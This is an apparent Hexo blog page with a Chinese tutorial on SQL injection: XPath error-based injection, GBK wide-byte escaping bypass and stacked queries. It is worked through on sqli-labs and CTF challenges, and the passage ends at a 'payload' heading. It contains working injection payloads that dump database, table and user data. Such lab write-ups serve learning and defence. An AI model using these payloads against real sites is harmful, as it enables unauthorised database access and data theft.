@@ -1,0 +1,1839 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="💗zihao">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="💗zihao">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="Saying and doing are two different things.">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>原理+实战掌握注入方法 · Lemon&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Lemon&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">原理+实战掌握注入方法</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Lemon's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/744896.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            原理+实战掌握注入方法
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+                Record my learning process of SQL.
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.5k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>SQL注入是web安全中最常见的攻击方式，SQL注入有很多方法，但如果只知道payload，不知道原理，感觉也很难掌握，这次就总结一下我所遇到的SQL注入方法，原理分析+题目实战。</p>
+<h1 id="0x00-Xpath报错注入"><a href="#0x00-Xpath报错注入" class="headerlink" title="0x00 Xpath报错注入"></a><strong>0x00 Xpath报错</strong>注入</h1><h3 id="涉及函数"><a href="#涉及函数" class="headerlink" title="涉及函数"></a><strong>涉及函数</strong></h3><p>updatexml():对xml进行查询和修改 </p>
+<p>extractvalue():对xml进行查询和修改 </p>
+<h3 id="报错语句构造"><a href="#报错语句构造" class="headerlink" title="报错语句构造"></a><strong>报错语句构造</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))；</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~'</span><br></pre></td></tr></table></figure>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a><strong>原理分析</strong></h3><p>extractvalue(xml_str , Xpath) 函数,按照Xpath语法从XML格式的字符串中提取一个值，如果函数中任意一个参数为NULL,返回值都是NULL。</p>
+<p>其实就是对XML文档进行查询的函数，相当于HTML文件中用 <code>&lt;div&gt;&lt;p&gt;&lt;a&gt;</code>等标签查找元素一样，第一个参数传入目标xml文档，第二个参数使用Xpath路径法表示的查找路径</p>
+<p>举个简单例子：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">'&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;'</span>,<span class="string">'/a/c'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>寻找前一段xml文档内容中的a节点下的c节点 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="comment">----------------------------------------------------------+</span></span><br><span class="line">| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;','/a/c') |</span><br><span class="line">+<span class="comment">----------------------------------------------------------+</span></span><br><span class="line">| accc                                                     |</span><br><span class="line">+<span class="comment">----------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
+<p>正常情况下的使用便是这样，但如果我们构造了不合法的Xpath ，MySQL便会出现语法错误，从而显示出XPath的内容。<br><img src="https://img-blog.csdnimg.cn/20191028163348873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>发现报错时少了一部分，没有前面的root，产生这样的问题是<strong>因为Xpath语法只有遇到特殊字符时才会报错</strong></p>
+<p>那我们直接在需要连接的字符前添加特殊字符即可爆出我们想要的结果<br><img src="https://img-blog.csdnimg.cn/20191028163408191.png" alt="在这里插入图片描述"><br>但是也要注意，报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断<br><img src="https://img-blog.csdnimg.cn/20191028163419131.png" alt="在这里插入图片描述"><br><code>updatexml()</code>函数 与<code>extractvalue()</code>类似 ，是更新xml文档的函数 </p>
+<p><code>updatexml()</code>函数有三个参数，分别是(XML_document, XPath_string, new_value) </p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称 </span><br><span class="line"></span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) </span><br><span class="line"></span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
+<p>原理相同，都是遇到特殊字符爆出错误</p>
+<p><img src="https://img-blog.csdnimg.cn/20191028163450725.png" alt="在这里插入图片描述"></p>
+<h3 id="题目实战"><a href="#题目实战" class="headerlink" title="题目实战"></a>题目实战</h3><p>sqli-labs17关，涉及到xpath报错注入 </p>
+<p>uname尝试发现没有任何变化，尝试下passwd，发现单引号报错，且有报错信息，可以使用xpath报错注入 尝试下爆出数据库</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=<span class="number">1'</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)# &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191028163512354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>既然xpath报错注入可以,那就来一一爆出表、字段、值即可</p>
+<p><strong>payload：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=<span class="number">1'</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,(select group_concat(table_name) from </span><br><span class="line">information_schema.TABLES where TABLE_SCHEMA=database()),<span class="number">1</span>)# &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191028163528244.png" alt="在这里插入图片描述"></p>
+<p>下面就基本上将payload改下即可，但到爆值时会出一个问题</p>
+<p><strong>payload</strong>：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=' or updatexml(1,concat(0x7e,(select username from users),0x7e),1)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191028163546765.png" alt="在这里插入图片描述"></p>
+<p>出现这个错误的，是因为不能先select出同一表中的某些值，再update这个表</p>
+<p>百度查找解决方法，发现需要再在外面加一层select即可解决</p>
+<p><strong>最终payload</strong>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=' or updatexml(1,concat(0x7e,(select username from (select username </span><br><span class="line">from users)c limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2019102816361270.png" alt="在这里插入图片描述"></p>
+<h1 id="0x01-宽字节注入"><a href="#0x01-宽字节注入" class="headerlink" title="0x01 宽字节注入"></a>0x01 宽字节注入</h1><h3 id="涉及函数-1"><a href="#涉及函数-1" class="headerlink" title="涉及函数"></a><strong>涉及函数</strong></h3><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串 </p>
+<p><code>mysql_real_escape_string()</code> 函数转义 SQL 语句中使用的字符串中的特殊字符 </p>
+<p><code>mysql_escape_string()</code> —  转义一个字符串 </p>
+<h3 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h3><p>先了解一下什么是窄、宽字节已经常见宽字节编码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一、当某字符的大小为一个字节时，称其字符为窄字节.</span><br><span class="line"></span><br><span class="line">二、当某字符的大小为两个字节时，称其字符为宽字节.</span><br><span class="line"></span><br><span class="line">三、所有英文默认占一个字节，汉字占两个字节</span><br><span class="line"></span><br><span class="line">四、常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</span><br></pre></td></tr></table></figure>
+<p>为什么会产生宽字节注入，其中就涉及到编码格式的问题了，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p>
+<p>问题就出现在使用PHP连接MySQL的时候，当设置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“<span class="keyword">set</span> character_set_client = gbk”</span><br></pre></td></tr></table></figure>
+<p>时会导致一个编码转换的问题 </p>
+<p>如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，原因是程序员为了防止SQL注入，就会调用我们上面所介绍的几种函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义 ，但这样并非安全，因为数据库使用的是宽字节编码，两个连在一起的字符会被当做是一个汉字，而在PHP使用的UTF8编码则认为是两个独立的字符，如果我们在单或双引号前添加一个字符，使其和斜杠（\）组合被当作一个汉字，从而保留单或双引号，使其发挥应用的作用。但添加的字符的Ascii要大于128，两个字符才能组合成汉字 ，因为前一个ascii码要大于128，才到汉字的范围 ，这一点需要注意。</p>
+<h3 id="题目实战-1"><a href="#题目实战-1" class="headerlink" title="题目实战"></a>题目实战</h3><p>大段的文字可能枯燥无味，下面实战来体验一下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1'</span></span><br></pre></td></tr></table></figure>
+<p>返回结果为</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your sql:select id,title from news where id = '1\''</span><br></pre></td></tr></table></figure>
+<p>发现被转义了，使用最经典的%df </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>返回结果为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your sql:select id,title from news where  id ='1運' and 1=1#'</span><br></pre></td></tr></table></figure>
+<p>％df和后面的\变成了一个汉字“运” ,所以单引号就可以不被转义，从而发挥闭合作用</p>
+<p>爆出数据库，下面就很简单了，相当于知道了闭合符号，常用的payload更改一下即可<br><img src="https://img-blog.csdnimg.cn/20191028163642689.png" alt="在这里插入图片描述"></p>
+<p>SQL-labs32和33关也涉及到了宽字节注入，输入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-32/?id=1'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191028163853822.png" alt="在这里插入图片描述"><br>发现也是被转义了，那可以试一下宽字节注入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-32/?id=1%df%27</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2019102816390656.png" alt="在这里插入图片描述"></p>
+<p>出现报错语句，说明单引号已经起作用了，后面的就常规payload即可</p>
+<h1 id="0x02-堆叠注入"><a href="#0x02-堆叠注入" class="headerlink" title="0x02 堆叠注入"></a>0x02 堆叠注入</h1><h3 id="涉及字符"><a href="#涉及字符" class="headerlink" title="涉及字符"></a><strong>涉及字符</strong></h3><p>分号<code>（;）</code>，在SQL语句中用来表示一条sql语句的结束 </p>
+<h3 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h3><p>堆叠注入可以执行任意的语句 ，多条sql 语句一起执行。在MYSQL命令框中，常以<code>;</code>作为结束符，那我们便可以在一句SQL语句结束后再紧跟一句SQL语句 。</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;use web1;select 1,2,3;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BWVS               |</span><br><span class="line">| bbs                |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">| web1               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">10 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">+<span class="comment">---+---+---+</span></span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> |</span><br><span class="line">+<span class="comment">---+---+---+</span></span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> |</span><br><span class="line">+<span class="comment">---+---+---+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>但堆叠注入是有局限性的，并不是每个环境都可以用到的:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一、可能受到API或者数据库引擎不支持的限制 </span><br><span class="line"></span><br><span class="line">二、权限不足</span><br></pre></td></tr></table></figure>
+<p>所以一般这种方法的注入只会出现在CTF题中，但正因为这种方法感觉简单，很多人都会忽略掉，强网杯的web题随便注便用到了这种方法，当时真的懵的一批。</p>
+<h3 id="题目实战-2"><a href="#题目实战-2" class="headerlink" title="题目实战"></a>题目实战</h3><p><img src="https://img-blog.csdnimg.cn/20191027222221420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现是回显注入，在测试过程中，发现<br><img src="https://img-blog.csdnimg.cn/2019102722233551.png" alt="在这里插入图片描述"><br>很多重要的关键字都被过滤了，发现可以使用堆叠注入，那就来尝试一波</p>
+<p>在此之前那，已经测试出<code>&#39;</code>为闭合符号，那就来查询数据库、数据表</p>
+<p><strong>查数据库</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span>;show databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191027222544764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>查询数据表</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span>;show tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191027222702495.png" alt="在这里插入图片描述"><br>再分别查询<code>1919810931114514</code>表和<code>words</code>表<br><img src="https://img-blog.csdnimg.cn/20191027222813886.png" alt="在这里插入图片描述"><br>查询words表时，发现有id列，我们随便输入数字时，会回显出对应内容，所以回显内容肯定是从word这张表中回显的</p>
+<p>再查询<code>1919810931114514</code>表</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span>;show columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191027222919226.png" alt="在这里插入图片描述"><br>但是到这里就会出现问题，虽然我们已经得到了flag了，但是<code>select</code>被过滤了，而<code>show</code>命令又不能查看值。这就比较头疼了，不过如果仔细观察的话，一开始过滤的并没有<code>alert</code> 和 <code>rename</code>，我们已经知道了<code>words</code>是用来回显内容的，能不能我们把<code>1919810931114514</code>这个表更改名字为<code>words</code>,并增加相应的字段，使之回显原<code>1919810931114514</code>这个表的内容那，当然是可以的，这种思路。。。大师傅tql</p>
+<p><strong>payload</strong>:</p>
